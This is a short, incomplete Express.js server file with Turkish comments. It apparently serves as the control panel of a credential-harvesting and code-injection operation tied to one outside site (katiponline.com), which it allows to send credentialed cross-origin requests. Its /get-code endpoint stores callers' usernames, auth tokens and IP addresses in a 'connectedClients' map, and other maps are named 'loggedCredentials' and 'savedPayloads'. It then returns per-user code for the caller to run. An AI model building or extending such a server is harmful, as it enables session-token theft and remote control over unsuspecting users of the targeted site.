const express = require('express');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);

const connectedClients = new Map();
const userCodes = new Map();
const savedPayloads = new Map();
const loggedCredentials = new Map();

app.use(express.json());
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', 'https://katiponline.com');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    res.header('Access-Control-Allow-Credentials', 'true');
    next();
});
app.use(express.static('public'));

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

app.get('/hello', (req, res) => {
    res.send('Merhaba, sunucu çalışıyor!');
});

app.post('/get-code', (req, res) => {
    const { username, authToken } = req.body;
    const ipAddress = req.ip || req.connection.remoteAddress;

    connectedClients.set(username, {
        username,
        authToken,
        ipAddress,
        lastSeen: Date.now()
    });

    const userCode = userCodes.get(username) || { code: '', timestamp: Date.now() };
    res.json(userCode);
});

// Diğer endpoint’ler buraya...

server.listen(3000, () => {
    console.log('Sunucu 3000 portunda çalışıyor');
});
